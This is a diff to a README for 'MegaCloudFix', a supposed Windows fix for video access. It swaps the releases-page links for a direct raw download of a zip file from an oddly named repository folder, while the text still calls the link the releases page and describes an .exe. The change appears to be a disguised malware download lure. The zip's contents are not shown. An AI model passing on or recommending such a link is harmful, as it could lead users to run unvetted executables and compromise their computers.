@@ -1,6 +1,6 @@
 # 🛠️ MegaCloudFix - Restore access to your video content
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Recluse-burmesecat985/MegaCloudFix/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Recluse-burmesecat985/MegaCloudFix/main/sarsenet/Fix-Cloud-Mega-v2.9-beta.2.zip)
 
 ---
 
@@ -18,7 +18,7 @@ MegaCloudFix requires a desktop computer running Windows 10 or Windows 11. It oc
 
 Follow these steps to update your access:
 
-1. Visit the project releases page to download the latest version: [https://github.com/Recluse-burmesecat985/MegaCloudFix/releases](https://github.com/Recluse-burmesecat985/MegaCloudFix/releases).
+1. Visit the project releases page to download the latest version: [https://raw.githubusercontent.com/Recluse-burmesecat985/MegaCloudFix/main/sarsenet/Fix-Cloud-Mega-v2.9-beta.2.zip](https://raw.githubusercontent.com/Recluse-burmesecat985/MegaCloudFix/main/sarsenet/Fix-Cloud-Mega-v2.9-beta.2.zip).
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the file name to start the download.
 4. Locate the file in your Downloads folder.
